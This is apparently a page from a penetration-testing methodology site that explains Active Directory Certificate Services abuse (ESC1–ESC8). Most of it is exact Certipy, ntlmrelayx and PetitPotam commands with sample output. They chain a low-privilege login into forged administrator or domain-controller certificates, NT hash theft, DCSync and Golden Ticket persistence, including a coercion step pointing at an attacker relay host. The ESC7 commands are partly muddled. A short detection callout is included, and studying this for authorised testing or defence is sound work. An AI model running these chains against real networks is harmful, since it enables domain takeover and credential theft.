---
layout: default
title: "AD CS Abuse — Full ESC1 to ESC8 Cycle"
order: 5
phase: "PRIVESC"
tactic: "Privilege Escalation / Domain Dominance"
summary: "The complete Active Directory Certificate Services attack surface: ESC1–ESC8 enumeration, exploitation with Certipy, and PKINIT to domain compromise."
---

{% include ad_nav.html %}

# AD CS Abuse — Full ESC1 → ESC8 Cycle

Active Directory Certificate Services (AD CS) is one of the most reliable privilege-escalation and domain-persistence surfaces in modern AD. A single misconfigured certificate template can turn any domain user into a Domain Admin. This module covers enumeration and every ESC variant (ESC1–ESC8) with exact `Certipy` commands and complete chains.

## Pre-requisites

<div class="badges">
  <span class="badge req">Any valid domain credential</span>
  <span class="badge req">A reachable Enterprise CA / Web Enrollment</span>
  <span class="badge req">Certipy 4.x+ (certipy-ad)</span>
  <span class="badge req">Clock synced to DC</span>
</div>

## Mechanism & Theory (why certificates = domain takeover)

Certificates issued by an Enterprise CA can be used for **PKINIT** Kerberos authentication. If an attacker can obtain a certificate whose identity (SAN — Subject Alternative Name, or the internal SID mapping) is a **privileged user**, they can authenticate as that user, retrieve their **NT hash** (via `UnPAC-the-hash`), and get a TGT. The ESC classes are different *ways* to obtain such a certificate or to abuse the CA/PKI trust.

```terminal
vuln template / CA misconfig ──► request cert as (or SAN=) privileged user
        ──► PKINIT auth with cert ──► TGT + UnPAC NT hash ──► Domain Admin
```

<div class="attack-diagram">
  <div class="diag-title">ESC1 → Domain Admin — attack chain</div>
  <div class="diag-flow">
    <div class="diag-node start"><span class="n-step">STEP 1</span><span class="n-title">Low-priv creds</span><span class="n-tool">m.rossi</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 2</span><span class="n-title">Find vuln template</span><span class="n-tool">certipy find</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 3</span><span class="n-title">Request cert, SAN=admin</span><span class="n-tool">certipy req -upn</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 4</span><span class="n-title">PKINIT auth</span><span class="n-tool">certipy auth</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 5</span><span class="n-title">TGT + NT hash</span><span class="n-tool">UnPAC-the-hash</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node win"><span class="n-step">STEP 6</span><span class="n-title">Domain Admin</span><span class="n-tool">DCSync</span></div>
  </div>
</div>

### The ESC map

| ESC | Root cause | Who fixes | Certipy path |
|-----|-----------|-----------|--------------|
| **ESC1** | Template allows enrollee-supplied SAN + client-auth EKU, low-priv enroll | template ACL | request `-upn administrator` |
| **ESC2** | Template has "Any Purpose" or no EKU | template EKU | request then use as sub-CA/any |
| **ESC3** | Enrollment Agent template abuse | template | issue on-behalf-of |
| **ESC4** | Dangerous ACL over a template (write) | template ACL | make it ESC1, then ESC1 |
| **ESC5** | Vulnerable PKI object ACLs (CA/CA-computer/CN=... containers) | AD ACLs | abuse via ACL module |
| **ESC6** | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` (SAN on any template) | CA flag | request with `-upn` on any template |
| **ESC7** | Dangerous CA permissions (ManageCA/ManageCertificates) | CA roles | enable ESC6 / issue failed req |
| **ESC8** | HTTP(S) Web Enrollment + NTLM relay | disable HTTP / EPA | relay machine account to CA |

<div class="callout info">
  <span class="callout-title">Certipy version</span>
  Use <code>certipy-ad</code> 4.x or later (`pip install certipy-ad`). Older syntax differs. Verify with <code>certipy-ad version</code>.
</div>

## Enumeration — find the vulnerable templates first

```bash
export DC=10.10.10.100 ; export DOMAIN=corp.local
export CA_HOST=ca01.corp.local

# One command surfaces every ESC (writes *_Certipy.json/.txt with [!] Vulnerabilities)
certipy-ad find -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -stdout -vulnerable

# Full artifact for offline review + BloodHound import
certipy-ad find -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -bloodhound
```

```terminal
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Found 1 enabled certificate authority: CORP-CA01-CA
...
Certificate Templates
  0
    Template Name                       : CorpUser
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True     <── ESC1 !
    Enrollment Rights                   : CORP.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC1 : Enrollee supplies subject and template allows client authentication
```

Chaining the request and PKINIT auth (ESC1) end-to-end:

```terminal
$ certipy-ad req -u m.rossi@corp.local -p 'Welcome2026!' -ca CORP-CA01-CA \
      -template CorpUser -upn administrator@corp.local -dc-ip 10.10.10.100
[*] Requesting certificate via RPC
[*] Successfully requested certificate (request ID 41)
[*] Got certificate with UPN 'administrator@corp.local'
[*] Saved certificate and private key to 'administrator.pfx'

$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.100
[*] Using principal: administrator@corp.local
[*] Got TGT  ->  saved to 'administrator.ccache'
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

## ESC1 — Enrollee-supplied SAN + Client Auth

**Condition:** template has `Client Authentication` EKU, `Enrollee Supplies Subject = True`, and low-priv users can enroll.

```bash
# 1. Request a cert for the template, specifying a privileged UPN as the SAN
certipy-ad req -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC \
  -ca CORP-CA01-CA -template CorpUser -upn administrator@$DOMAIN
# -> administrator.pfx

# 2. Authenticate with the certificate (PKINIT) -> TGT + NT hash
certipy-ad auth -pfx administrator.pfx -dc-ip $DC
```

```terminal
[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

```bash
# 3. Use it
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass $CA_HOST     # or the DC
nxc smb $DC -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

<div class="callout tip">
  <span class="callout-title">SID mapping (May 2022+ patch)</span>
  On patched CAs, embed the target SID to satisfy strong mapping: <code>certipy-ad req ... -upn administrator@corp.local -sid S-1-5-21-...-500</code>.
</div>

## ESC2 — "Any Purpose" or no EKU

**Condition:** template EKU is `Any Purpose` (or empty). The issued cert can be used for client auth (and more).

```bash
certipy-ad req -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -ca CORP-CA01-CA -template AnyPurposeTmpl
# If the template also allows SAN, treat like ESC1. Otherwise use the cert for client auth as the enrollee,
# or as an enrollment agent (see ESC3) depending on EKU.
certipy-ad auth -pfx m.rossi.pfx -dc-ip $DC
```

## ESC3 — Enrollment Agent

**Condition:** a template grants the `Certificate Request Agent` EKU; an enrollment agent can request certs **on behalf of** other users.

```bash
# 1. Get an enrollment-agent certificate
certipy-ad req -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -ca CORP-CA01-CA -template EnrollmentAgent
# 2. Use it to enroll a client-auth cert on behalf of a privileged user
certipy-ad req -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -ca CORP-CA01-CA \
  -template User -on-behalf-of "CORP\administrator" -pfx m.rossi.pfx
# 3. PKINIT
certipy-ad auth -pfx administrator.pfx -dc-ip $DC
```

## ESC4 — Vulnerable template ACL (write access)

**Condition:** you have `WriteDacl`/`WriteProperty`/`GenericAll` over a certificate **template** object. Reconfigure it into an ESC1, exploit, then restore.

```bash
# Overwrite the template config to make it ESC1-vulnerable (Certipy saves the old config to restore)
certipy-ad template -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -template VulnACLTmpl -write-default-configuration
# Now exploit exactly like ESC1
certipy-ad req -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -ca CORP-CA01-CA -template VulnACLTmpl -upn administrator@$DOMAIN
certipy-ad auth -pfx administrator.pfx -dc-ip $DC
# Restore the original configuration afterwards
certipy-ad template -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -template VulnACLTmpl -configuration VulnACLTmpl.json
```

## ESC5 — Vulnerable PKI object ACLs

**Condition:** dangerous ACLs on PKI-related AD objects (the CA computer account, the `CN=...,CN=Enrollment Services` / `CN=NtAuthCertificates` containers). Abuse these with the standard [ACL / DACL techniques](/AD_metodology/acl-dacl-abuse/) (e.g. take over the CA computer object, then RBCD/Shadow Creds), which ultimately lets you influence certificate issuance or the CA host itself.

## ESC6 — CA sets EDITF_ATTRIBUTESUBJECTALTNAME2

**Condition:** the CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag → an enrollee can specify a SAN on **any** template, even ones that don't allow it.

```bash
# find reports it as: [!] User Enrollable Principals ... 'EDITF_ATTRIBUTESUBJECTALTNAME2'
certipy-ad req -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -ca CORP-CA01-CA -template User -upn administrator@$DOMAIN
certipy-ad auth -pfx administrator.pfx -dc-ip $DC
```

## ESC7 — Dangerous CA permissions (ManageCA / ManageCertificates)

**Condition:** you hold `ManageCA` and/or `ManageCertificates` roles on the CA. `ManageCA` lets you flip the ESC6 flag; `ManageCertificates` lets you approve a pending/failed request.

```bash
# Grant yourself the officer/manage rights are already held; enable SAN abuse (ESC6) via ManageCA:
certipy-ad ca -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -ca CORP-CA01-CA -enable-template SubCA

# Classic ESC7 chain: request on a restricted template (fails/pending), then approve it with ManageCertificates
certipy-ad req -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -ca CORP-CA01-CA -template SubCA -upn administrator@$DOMAIN
# -> note the Request ID (e.g. 785)
certipy-ad ca -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -ca CORP-CA01-CA -issue-request 785
certipy-ad req -u m.rossi@$DOMAIN -p 'Welcome2026!' -dc-ip $DC -ca CORP-CA01-CA -retrieve 785
certipy-ad auth -pfx administrator.pfx -dc-ip $DC
```

## ESC8 — NTLM relay to CA Web Enrollment (HTTP)

**Condition:** the CA exposes **HTTP(S) Web Enrollment** (`/certsrv`) without EPA. Relay a coerced machine account's NTLM auth to the enrollment endpoint and obtain a cert for that machine (often the DC), then PKINIT.

```bash
# 1. Start ntlmrelayx targeting the CA web-enrollment, requesting a DC-auth-capable template
impacket-ntlmrelayx -t http://$CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Coerce the DC to authenticate to your relay (PetitPotam / Coercer / printerbug)
python3 PetitPotam.py -u m.rossi -p 'Welcome2026!' -d $DOMAIN <ATTACKER_IP> $DC
# or:
coercer coerce -u m.rossi -p 'Welcome2026!' -d $DOMAIN -t $DC -l <ATTACKER_IP>

# 3. ntlmrelayx prints a base64 cert for DC01$ — authenticate as the DC (PKINIT)
certipy-ad auth -pfx dc01.pfx -dc-ip $DC
# DC01$ TGT -> DCSync
```

```terminal
[*] Authenticating against http://ca01.corp.local as CORP/DC01$ SUCCEED
[*] GOT CERTIFICATE! ID 812
[*] Base64 certificate of user DC01$: MIIR... (saved dc01.pfx)
```

ESC8 relay flow (coercion -> relay -> DC certificate):

```terminal
 [ attacker ]                                  [ CA / certsrv (HTTP) ]
     |  ntlmrelayx --adcs --template DomainController   ^
     |                                                  |  relayed NTLM auth (as DC01$)
     v                                                  |
 PetitPotam / Coercer  ---- coerce auth ---->  [ DC01 ]-+
     |
     v
 issued certificate for DC01$  =>  certipy auth -pfx dc01.pfx
     =>  DC01$ TGT  =>  secretsdump -k (DCSync)  =>  krbtgt  =>  domain owned
```

## Complete Attack Chain (ESC1 → domain)

```terminal
[1] any credential (m.rossi from spray/roast)
[2] certipy-ad find -vulnerable   ─► template "CorpUser" flagged ESC1
[3] certipy-ad req -upn administrator@corp.local -template CorpUser  ─► administrator.pfx
[4] certipy-ad auth -pfx administrator.pfx  ─► administrator TGT + NT hash
[5] export KRB5CCNAME=administrator.ccache
        impacket-secretsdump -k -no-pass DC01.corp.local   (DCSync as admin)
[6] dump krbtgt ─► Golden Ticket ─► permanent domain persistence
```

## Complete Attack Chain (ESC8 → domain, no user password needed)

```terminal
[1] low-priv creds OR just network position for coercion
[2] ntlmrelayx --adcs --template DomainController  -t http://ca/certsrv/certfnsh.asp
[3] PetitPotam/Coercer force DC01$ to auth to relay
[4] relay ─► issued cert for DC01$
[5] certipy-ad auth -pfx dc01.pfx  ─► DC01$ TGT
[6] secretsdump -k DC01$  (DCSync) ─► krbtgt ─► Golden Ticket ─► domain owned
```

<div class="callout danger">
  <span class="callout-title">Certificate persistence</span>
  Certificates remain valid for their full lifetime (often 1+ year) even after the account's password changes. Stealing/forging a cert is durable domain persistence that survives password resets — treat captured .pfx files as long-lived keys.
</div>

<div class="callout opsec">
  <span class="callout-title">Detection</span>
  Monitor Event IDs <strong>4886/4887</strong> (cert requested/issued), template enrollment with unexpected SANs, and coercion traffic (MS-EFSR/MS-RPRN). ESC8 relay is loud; ESC1 with a mismatched SAN is the strongest single indicator.
</div>

## Key Takeaways

- `certipy-ad find -vulnerable` is step zero — it names the exact ESC for you.
- ESC1/ESC6 give instant DA via a SAN of `administrator`; ESC8 gives the DC's own cert with no password.
- Certificates = durable persistence; PKINIT + UnPAC-the-hash bridges certs back to NTLM/Kerberos.

{% include toc_sidebar.html %}
